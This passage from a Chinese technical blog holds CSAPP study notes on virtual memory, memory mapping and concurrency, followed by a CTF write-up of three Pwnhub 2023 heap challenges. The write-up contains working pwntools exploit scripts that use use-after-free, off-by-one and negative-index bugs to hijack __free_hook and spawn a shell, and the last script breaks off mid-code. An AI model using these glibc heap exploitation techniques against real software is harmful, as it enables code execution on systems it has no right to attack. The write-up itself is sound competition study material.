class="headerlink" title="9.1 物理和虚拟寻址"></a>9.1 物理和虚拟寻址</h2><p>使用虚拟寻址,CPU通过生成一个虚拟地址(VA)来访问主存,该虚拟地址被CPU上芯片上的内存管理单元(利用存放在主存中的页表)翻译为物理地址.</p><h2 id="9-3-虚拟内存作为缓存的工具"><a href="#9-3-虚拟内存作为缓存的工具" class="headerlink" title="9.3 虚拟内存作为缓存的工具"></a>9.3 虚拟内存作为缓存的工具</h2><p>VM系统将虚拟内存分割为虚拟页(VP)作为主存和磁盘之间的传输单元.类似的,物理内存被分割为物理页(PP),大小与VP相同.物理页也被称为页帧(page frame)<br>在任意时刻虚拟页面的集合都分为三个不相交的子集:</p><ol><li>未分配的:VM还未分配或创建的页.未分配的页没有任何数据和它们相关联,因此也就不占用任何磁盘空间.</li><li>缓存的:当前已缓存在物理内存中的已分配页</li><li>未缓存的:未缓存在物理内存中的已分配页(即只存在于磁盘上)</li></ol><h3 id="页表"><a href="#页表" class="headerlink" title="页表"></a>页表</h3><p>虚拟内存系统必须有某种方法判定一个虚拟页是否缓存在DRAM中的某个地方.如果是,系统还必须确定这个虚拟页存放在哪个物理页中.如果不命中,系统必须判断这个虚拟页存放在磁盘的哪个位置.在物理内存中选择一个牺牲页,并将虚拟页从磁盘复制到DRAM中,替换这个牺牲页.</p><p>页表存放在物理内存中,将虚拟页映射到物理页.每次地址翻译时都会读取页表.操作系统负责维护页表内容,以及在磁盘与DRAM之间来回传送页.<br>页表是一个页表条目(PTE)的数组.虚拟地址空间的每个页在页表中一个固定偏移量处都有一个PTE.</p><p>简化后的页表示意图:<br>将每个PTE简化为一个有效位和一个n位地址字段.<br>若有效位为1,说明该条目对应的虚拟页缓存在物理内存中,地址字段保存该物理页的物理页号.<br>若有效位为0,说明该条目对应虚拟页未缓存.地址字段表示该虚拟页对应的磁盘地址,若为空表示该虚拟页还未分配.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306191358796.jpg"></p><h3 id="缺页"><a href="#缺页" class="headerlink" title="缺页"></a>缺页</h3><p>DRAM缓存不命中称为缺页.<br>缺页后触发缺页异常,调用内核中的缺页异常处理程序,选择一个牺牲页进行替换(页面调度)并修改页表.若该牺牲页已经被修改过了,那么内核会将它复制回磁盘.<br>(言外之意就是,其实物理内存中的已经缓存的页在磁盘中也有一个副本,要是没修改过就不用更新,不过已分配页的磁盘地址保存在哪?)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306191403569.jpg"></p><h3 id="局部性"><a href="#局部性" class="headerlink" title="局部性"></a>局部性</h3><p>局部性原则保证了在任意时刻,程序趋向于在一个较小的活动页面集合上工作,这个集合叫做工作集或者常驻集合.如果工作集的大小超出了物理内存的大小,就产生”抖动”.</p><h2 id="9-6-地址翻译"><a href="#9-6-地址翻译" class="headerlink" title="9.6 地址翻译"></a>9.6 地址翻译</h2><p>口述一遍这个图的流程,每个流程是怎么实现的以及每一个流程的目的,为什么能加快速度或节约物理内存,地址翻译也就差不多搞清楚了.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306191759005.jpg"></p><h2 id="9-8-内存映射"><a href="#9-8-内存映射" class="headerlink" title="9.8 内存映射"></a>9.8 内存映射</h2><h3 id="内存映射与对象"><a href="#内存映射与对象" class="headerlink" title="内存映射与对象"></a>内存映射与对象</h3><p>Linux通过将一个虚拟内存区域与一个磁盘上的对象关联起来,以初始化这个虚拟内存区域的内容,这个过程称为写时映射.(对象分为普通文件和匿名文件)<br>如果一个进程将一个共享对象映射到它的虚拟地址空间的一个区域内,那么这个进程对这个区域的任何些操作,对于任何映射了这个共享对象的其他进程也是可见的.而且这些变化也会反映在磁盘上的原始对象中.<br>对于一个映射到私有对象的区域所作的改变,对其他进程来说是不可见的.并且进程对这个区域做的所有操作都不会反映在磁盘的对象中.(对这一点的理解,比如pwn题你改了bss段的数据,可执行文件改变了吗?)</p><p>当两个进程将同一个私有对象映射到虚拟内存中时,共享这个对象的同一个物理副本.该区域在每个进程的页表条目中都被标记为只读.当一个进程试图写这个区域时触发缺页异常,异常处理程序发现该异常是由于对<code>"私有的写时复制区域中的一个页面"</code>的写造成的,就会在物理内存中创建这个页面的一个新副本,更新该进程的页表条目指向这个新副本,恢复该页面的可写权限.</p><h3 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h3><p>当fork被进程调用,内核为新进程创建各种数据结构.创建了当前进程的mm_struct、区域结构和页表的原样副本,并将两个进程中的每个页面都标记为只读,每个区域结构都标记为私有的写时复制.(父子进程私有地址空间的原理)</p><blockquote><p>提问:既然都标为只读和私有的写时复制了,那父子进程都进行写操作后,不久存三个物理副本了?这不是浪费吗…<br>答:”进程对私有对象的区域所作的改变不会反映在磁盘对象中”,也就是说就算你只有一个进程,进行写的时候也会产生副本,因为改变不能反映在磁盘对象中</p></blockquote><h3 id="execve"><a href="#execve" class="headerlink" title="execve"></a>execve</h3><p>从内存映射的视角再看execve做了些什么.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">execve</span>(<span class="string">"a.out"</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br></pre></td></tr></tbody></table></figure><ol><li>删除已存在的用户区域,删除当前进程虚拟地址的用户部分中的已存在的区域结构</li><li>映射私有区域,为新程序的代码、数据、bss和栈区域创建新的数据结构.代码和数据区域被映射为可执行文件中的.text和.data区,bss段是请求二进制零的,映射到匿名文件.(这里可以与C/C++中的变量存储联系起来,什么样的变量会存到bss段?未初始化的静态变量和初始化为0的全局(或静态)变量)</li><li>映射共享区域.libc.so之类的.</li><li>设置程序计数器(PC),指向代码区域的入口点.<br>当然这只是完成了映射,当开始执行时,才调度页面进入主存.</li></ol><h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><p>Linux进程可以使用mmap创建新的虚拟内存区域,并将对象映到这些区域中.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span>* <span class="title">mmap</span><span class="params">(<span class="type">void</span>* start,<span class="type">size_t</span> lenth,<span class="type">int</span> prot,<span class="type">int</span> flags,<span class="type">int</span> fd,<span class="type">off_t</span> offset)</span></span></span><br><span class="line"><span class="function"><span class="comment">//start:新区域的起始地址</span></span></span><br><span class="line"><span class="function"><span class="comment">//prot:权限</span></span></span><br><span class="line"><span class="function"><span class="comment">//flags:对象类型,MAP_ANON,MAP_SHARED,MAP_PRIVATE</span></span></span><br><span class="line"><span class="function"><span class="comment">//fd:文件描述符(回想一下内存映射的对象就是文件)</span></span></span><br><span class="line"><span class="function"><span class="comment">//offset:映射开始位置相对文件起始位置的偏移量</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">munmap</span><span class="params">(<span class="type">void</span>* start,<span class="type">size_t</span> lenth)</span></span>;</span><br></pre></td></tr></tbody></table></figure><h2 id="9-9-动态内存分配"><a href="#9-9-动态内存分配" class="headerlink" title="9.9 动态内存分配"></a>9.9 动态内存分配</h2><h3 id="9-9-3-分配器的要求和目标"><a href="#9-9-3-分配器的要求和目标" class="headerlink" title="9.9.3 分配器的要求和目标"></a>9.9.3 分配器的要求和目标</h3><h4 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h4><ol><li>处理任意请求序列</li><li>立即响应请求</li><li>只使用堆</li><li>对齐块</li><li>不修改已分配的块</li></ol><h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><ol><li>最大化吞吐率</li><li>最大化内存利用率</li></ol><h3 id="9-9-5-实现问题"><a href="#9-9-5-实现问题" class="headerlink" title="9.9.5 实现问题"></a>9.9.5 实现问题</h3><p>空闲块组织:如何记录空闲块<br>放置:如何选择合适的空闲块来放置新分配的块<br>分割:在一个新分配的块放置到某个空闲块之后,我们如何处理这个空闲块中的剩余部分?<br>合并:如何处理一个刚刚释放的块(如何处理内存中连续的多个空闲块)</p><h1 id="第十一章-网络编程"><a href="#第十一章-网络编程" class="headerlink" title="第十一章 网络编程"></a>第十一章 网络编程</h1><h2 id="11-1-客户端-服务器编程模型"><a href="#11-1-客户端-服务器编程模型" class="headerlink" title="11.1 客户端-服务器编程模型"></a>11.1 客户端-服务器编程模型</h2><p>每个网络应用都是基于客户端-服务器模型的.该模型的基本操作是事物.<br>一个事物由四步组成:</p><ol><li>客户端向服务器发送请求</li><li>服务器接收、解释请求,以适当的方式操作它的资源.</li><li>服务器给客户端发送一个响应,等待下一个请求.</li><li>客户端收到响应并处理它.</li></ol><h2 id="11-3"><a href="#11-3" class="headerlink" title="11.3"></a>11.3</h2><p>数据可以同时双向流动,它是全双工的.<br>一个套接字是连接的一个断点.每个套接字都有相应的套接字地址.当客户端发起一个连接请求,客户端套接字地址的端口是由内核自动分配的,称为临时端口.<br>一个连接是由它两端的套接字地址唯一确定的.这对套接字地址叫做套接字对.<br>(cliaddr:cliport,servaddr:servport)</p><h1 id="第十二章-并发编程"><a href="#第十二章-并发编程" class="headerlink" title="第十二章 并发编程"></a>第十二章 并发编程</h1><p>互斥（mutualexclusion）:保证一个线程在临界区执行时，其他线程应该被阻止进入临界区.互斥也并不是只针对多线程。在多进程竞争共享资源的时候，也同样是可以使用互斥的方式来避免资源竞争造成的资源混乱。<br>同步，就是并发进程/线程在一些关键点上可能需要互相等待与互通消息，这种相互制约的等待与互通信息称为进程/线程同步。<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306261127339.png"></p><p>互斥一般用锁来实现,同步用信号量来实现.信号量同时也可以用作互斥锁.</p><h2 id="12-5-用信号量同步线程"><a href="#12-5-用信号量同步线程" class="headerlink" title="12.5 用信号量同步线程"></a>12.5 用信号量同步线程</h2><h3 id="12-5-4-利用信号量来调度共享资源"><a href="#12-5-4-利用信号量来调度共享资源" class="headerlink" title="12.5.4 利用信号量来调度共享资源"></a>12.5.4 利用信号量来调度共享资源</h3><h4 id="生产者-消费者问题"><a href="#生产者-消费者问题" class="headerlink" title="生产者-消费者问题"></a>生产者-消费者问题</h4><h5 id="CSAPP实例程序中多个P-V操作的顺序问题"><a href="#CSAPP实例程序中多个P-V操作的顺序问题" class="headerlink" title="CSAPP实例程序中多个P,V操作的顺序问题"></a>CSAPP实例程序中多个P,V操作的顺序问题</h5><p>P的顺序是不可交换的,一定是先P可用槽数量或可用数据的信号量,再P互斥锁.否则当互斥锁上锁之后再发现无可用槽或数据,该线程阻塞,而此时对应的生产者/消费者线程由于无法互斥锁上锁同样阻塞,形成死锁.也就是说,互斥锁的上锁一定是在判断完其他条件之后,在正式访问、更改数据之前的最后一个操作.</p><p>V的顺序是可交换的,但类似示例程序的情形还是推荐先解锁.对于该次Insert后槽已填满的情况,V(slots)的行为的速度对其他线程并无影响.但互斥锁会阻塞消费者读取数据.所以先解锁再V(slots)可以加快消费者的速度,尽量减少槽被填满后下次生产者的阻塞.</p><h4 id="读者写者问题"><a href="#读者写者问题" class="headerlink" title="读者写者问题"></a>读者写者问题</h4><blockquote><pre><code>「读-读」允许：同一时刻，允许多个读者同时读「读-写」互斥：没有写者时读者才能读，没有读者时写者才能写「写-写」互斥：没有其他写者时，写者才能写</code></pre></blockquote><h4 id="生产者消费者区别和读者写者问题的区别"><a href="#生产者消费者区别和读者写者问题的区别" class="headerlink" title="生产者消费者区别和读者写者问题的区别"></a>生产者消费者区别和读者写者问题的区别</h4><p>前者用于数据生成和消费分离的场景,后者适用于读操作和写操作分离的场景.<br>多个读者可以同时读取共享数据.多个生产者不能同时完成生产.<br><a href="https://zhuanlan.zhihu.com/p/161936748">https://zhuanlan.zhihu.com/p/161936748</a></p><h3 id="12-7-5-死锁"><a href="#12-7-5-死锁" class="headerlink" title="12.7.5 死锁"></a>12.7.5 死锁</h3><p>如果每个线程都是以一种顺序获得互斥锁并已相反的顺序释放,那么这个程序就是无死锁的.</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnhub 2023 3月公开赛 WP</title>
      <link href="/2023/Pwnhub-2023-March-WP/"/>
      <url>/2023/Pwnhub-2023-March-WP/</url>
      
        <content type="html"><![CDATA[<p>Pwnhub 2023 3月公开赛 WP</p><h2 id="sh-v1-1"><a href="#sh-v1-1" class="headerlink" title="sh_v1_1"></a>sh_v1_1</h2><p>glibc2.31堆题<br>一堆莫名其妙的全局变量运算,白看了半天最后发现一点用都没有.<br>恢复一下结构体</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span>{</span></span><br><span class="line"><span class="type">long</span> flag;</span><br><span class="line"><span class="type">char</span> filename[<span class="number">32</span>];</span><br><span class="line"><span class="type">char</span>* content_ptr;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>程序逻辑就是模拟的一个linux终端,输入命令进行相应处理.<br>漏洞在ln的时候可以备份指针造成uaf</p><span id="more"></span><p>先free两个堆块进tcache,然后uaf部分覆写next指针指向另一个堆块的size域,改成0x421放进unsortedbin泄露libc地址.<br>之后正常打free_hook就行了</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func,addr</span>):</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">global</span> libc,libc_base,system_addr,binsh_addr,realloc_addr,free_hook_addr,onegadget</span><br><span class="line">&nbsp; &nbsp; libc = finder(func,addr)</span><br><span class="line">&nbsp; &nbsp; libc_base = libc.libcbase</span><br><span class="line">&nbsp; &nbsp; realloc_addr = libc.dump(<span class="string">'realloc'</span>)</span><br><span class="line">&nbsp; &nbsp; system_addr = libc.dump(<span class="string">'system'</span>)</span><br><span class="line">&nbsp; &nbsp; malloc_hook_addr = libc.dump(<span class="string">'__malloc_hook'</span>)</span><br><span class="line">&nbsp; &nbsp; free_hook_addr = libc.dump(<span class="string">'__free_hook'</span>)</span><br><span class="line">&nbsp; &nbsp; binsh_addr=libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">&nbsp; &nbsp; <span class="comment"># onegadget = libc.ogg(1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">touch</span>(<span class="params">file,content</span>):</span><br><span class="line">&nbsp; &nbsp; io.sendlineafter(<span class="string">'&gt;&gt;&gt;&gt;'</span>,<span class="string">'touch '</span>+file)</span><br><span class="line">&nbsp; &nbsp; sleep(<span class="number">0.1</span>)</span><br><span class="line">&nbsp; &nbsp; io.sendline(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cp</span>(<span class="params">file1,file2</span>):</span><br><span class="line">&nbsp; &nbsp; io.sendlineafter(<span class="string">'&gt;&gt;&gt;&gt;'</span>,<span class="string">'cp '</span>+file1+<span class="string">' '</span>+file2)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gedit</span>(<span class="params">file,content</span>):</span><br><span class="line">&nbsp; &nbsp; io.sendlineafter(<span class="string">'&gt;&gt;&gt;&gt;'</span>,<span class="string">'gedit '</span>+file)</span><br><span class="line">&nbsp; &nbsp; sleep(<span class="number">0.1</span>)</span><br><span class="line">&nbsp; &nbsp; io.sendline(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>():</span><br><span class="line">&nbsp; &nbsp; io.sendlineafter(<span class="string">'&gt;&gt;&gt;&gt;'</span>,<span class="string">'ls'</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cat</span>(<span class="params">file</span>):</span><br><span class="line">&nbsp; &nbsp; io.sendlineafter(<span class="string">'&gt;&gt;&gt;&gt;'</span>,<span class="string">'cat '</span>+file)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rm</span>(<span class="params">file</span>):</span><br><span class="line">&nbsp; &nbsp; io.sendlineafter(<span class="string">'&gt;&gt;&gt;&gt;'</span>,<span class="string">'rm '</span>+file)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ln</span>(<span class="params">file1,file2</span>):</span><br><span class="line">&nbsp; &nbsp; io.sendlineafter(<span class="string">'&gt;&gt;&gt;&gt;'</span>,<span class="string">'ln '</span>+file1+<span class="string">' '</span>+file2)</span><br><span class="line"></span><br><span class="line">touch(<span class="string">'1'</span>,<span class="string">'a'</span>)</span><br><span class="line">touch(<span class="string">'2'</span>,<span class="string">'a'</span>)</span><br><span class="line">touch(<span class="string">'3'</span>,<span class="string">'a'</span>)</span><br><span class="line">touch(<span class="string">'4'</span>,<span class="string">'a'</span>)</span><br><span class="line">touch(<span class="string">'5'</span>,<span class="string">'a'</span>)</span><br><span class="line">ln(<span class="string">'1'</span>,<span class="string">'1_ln'</span>)</span><br><span class="line">ln(<span class="string">'1'</span>,<span class="string">'1_ln2'</span>)</span><br><span class="line">ln(<span class="string">'2'</span>,<span class="string">'2_ln'</span>)</span><br><span class="line">ln(<span class="string">'3'</span>,<span class="string">'3_ln'</span>)</span><br><span class="line">rm(<span class="string">'2'</span>)</span><br><span class="line">rm(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">cat(<span class="string">'1_ln'</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))-<span class="number">0x4b0</span></span><br><span class="line">log.success(<span class="string">"heap_base is -&gt; "</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">gedit(<span class="string">'1_ln'</span>,<span class="string">'\xa0'</span>)</span><br><span class="line">touch(<span class="string">'6'</span>,<span class="string">'a'</span>)</span><br><span class="line">touch(<span class="string">'420'</span>,flat([<span class="number">0</span>,<span class="number">0x421</span>]))</span><br><span class="line">ln(<span class="string">'420'</span>,<span class="string">'420_ln'</span>)</span><br><span class="line">rm(<span class="string">'2_ln'</span>)</span><br><span class="line">gedit(<span class="string">'420_ln'</span>,<span class="string">'a'</span>*<span class="number">16</span>)</span><br><span class="line">cat(<span class="string">'420_ln'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'a'</span>*<span class="number">16</span>)</span><br><span class="line">main_arena = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))-<span class="number">96</span></span><br><span class="line">find_libc(<span class="string">'__malloc_hook'</span>,main_arena-<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">gedit(<span class="string">'420_ln'</span>,flat([<span class="number">0</span>,<span class="number">0x421</span>]))</span><br><span class="line">rm(<span class="string">'5'</span>)</span><br><span class="line">rm(<span class="string">'1_ln2'</span>)</span><br><span class="line">gedit(<span class="string">'1_ln'</span>,p64(free_hook_addr))</span><br><span class="line">touch(<span class="string">'HanQi'</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">touch(<span class="string">'pwn'</span>,p64(system_addr))</span><br><span class="line">rm(<span class="string">'HanQi'</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="ttsc"><a href="#ttsc" class="headerlink" title="ttsc"></a>ttsc</h2><p>intro的时候可以泄露栈地址和libc地址.<br>栈地址只要填满buf就可以顺带出来,<br>而libc地址得益于scanf的匹配机制.<br>scanf(“%d”,&amp;v1);时若接收到无法匹配的数据,v1的值将不会被改变.<br>将原始的v1和v2分成高低部分赋给v8,gdb发现是一个_IO_file_jumps的地址<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202303130942054.png"><br>然后是正常的堆操作,edit的时候有个offbyone,overlap打free_hook就行<br>(偶然发现最后直接free掉free_hook那个堆块而不是’/bin/sh’那个也能getshell,不太懂)</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">intro(<span class="string">'a'</span>*<span class="number">0x10</span>,<span class="string">'-'</span>,<span class="string">'-'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'a'</span>*<span class="number">16</span>)</span><br><span class="line">rbp = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">io.recvuntil(<span class="string">'age: '</span>)</span><br><span class="line">IO_file_jumps_low = <span class="built_in">int</span>(io.recv(<span class="number">10</span>))</span><br><span class="line"><span class="keyword">if</span> IO_file_jumps_low&lt;<span class="number">0</span>:</span><br><span class="line">&nbsp; &nbsp; IO_file_jumps_low += <span class="number">0x100000000</span></span><br><span class="line">io.recvuntil(<span class="string">'high: '</span>)</span><br><span class="line">IO_file_jumps_high = <span class="built_in">int</span>(io.recv(<span class="number">5</span>))</span><br><span class="line">IO_file_jumps = IO_file_jumps_low+(IO_file_jumps_high&lt;&lt;<span class="number">32</span>)</span><br><span class="line">find_libc(<span class="string">'_IO_file_jumps'</span>,IO_file_jumps)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x28</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x38</span>,<span class="string">'a'</span>)</span><br><span class="line">edit(<span class="number">0</span>,flat([<span class="string">'a'</span>*<span class="number">0x40</span>,<span class="number">0x50</span>,<span class="string">b'\x71'</span>]))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>,<span class="string">'a'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,flat([<span class="string">'\x00'</span>*<span class="number">0x28</span>,<span class="number">0x41</span>,free_hook_addr]))</span><br><span class="line"></span><br><span class="line">io.sendline()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x38</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="three-edit"><a href="#three-edit" class="headerlink" title="three_edit"></a>three_edit</h2><p>glibc2.31堆题,限制了堆块大小0x50-0x70<br>虽然题目叫three_edit,汇编代码中也确实有一个判断,不过是恒成立的所以可以无限edit.<br>看半天愣是没发现洞在哪,edit的时候没有检查idx的正负<br>(其实是关注了一下的,只不过当时看add函数看到idx是个unsigned int就没管了)</p><p>写入小于0的idx使edit的时候能使用tcache_perthread_struct中的指针完成uaf.<br>部分覆写next指针修改size域放进unsortedbin(调整一下堆块的位置就不用爆破一位了),然后切割unsortedbin中的chunk使得unsortedbin chunk的fd指针和某tcache chunk的next指针重合,再次uaf打io_leak.最后劫持free_hook.</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">&nbsp; &nbsp; io = remote(url,port)</span><br><span class="line">&nbsp; &nbsp; <span class="comment"># io = process('./'+binary)</span></span><br><span class="line">&nbsp; &nbsp; <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; add(i,<span class="number">0x60</span>,<span class="built_in">str</span>(i))</span><br><span class="line">&nbsp; &nbsp; add(<span class="number">14</span>,<span class="number">0x50</span>,<span class="string">'a'</span>)</span><br><span class="line">&nbsp; </span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">2</span>)</span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; edit(-<span class="number">61</span>,<span class="string">b'\x50'</span>)</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; add(<span class="number">12</span>,<span class="number">0x60</span>,<span class="string">'a'</span>)</span><br><span class="line">&nbsp; &nbsp; add(<span class="number">13</span>,<span class="number">0x60</span>,<span class="string">'\x00'</span>)</span><br><span class="line">&nbsp; &nbsp; edit(<span class="number">1</span>,flat([<span class="string">'\x00'</span>*<span class="number">0x38</span>,<span class="number">0x421</span>]))</span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">10</span>)</span><br><span class="line">&nbsp; &nbsp; add(<span class="number">10</span>,<span class="number">0x50</span>,<span class="string">'a'</span>)</span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; add(<span class="number">2</span>,<span class="number">0x70</span>,<span class="string">'a'</span>)</span><br><span class="line">&nbsp; &nbsp; add(<span class="number">3</span>,<span class="number">0x70</span>,<span class="string">'a'</span>)</span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">11</span>)</span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">12</span>)</span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">5</span>)</span><br><span class="line">&nbsp; &nbsp; add(<span class="number">13</span>,<span class="number">0x70</span>,<span class="string">'a'</span>)</span><br><span class="line">&nbsp; &nbsp; edit(-<span class="number">61</span>,<span class="string">b'\xa0\x36'</span>)</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; add(<span class="number">11</span>,<span class="number">0x60</span>,<span class="string">'a'</span>)</span><br><span class="line">&nbsp; &nbsp; fake_stdout = flat([</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="number">0xfbad1800</span>,</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="string">b'\x00'</span></span><br><span class="line">&nbsp; &nbsp; ])</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">try</span>:</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; add(<span class="number">12</span>,<span class="number">0x60</span>,fake_stdout)</span><br><span class="line">&nbsp; 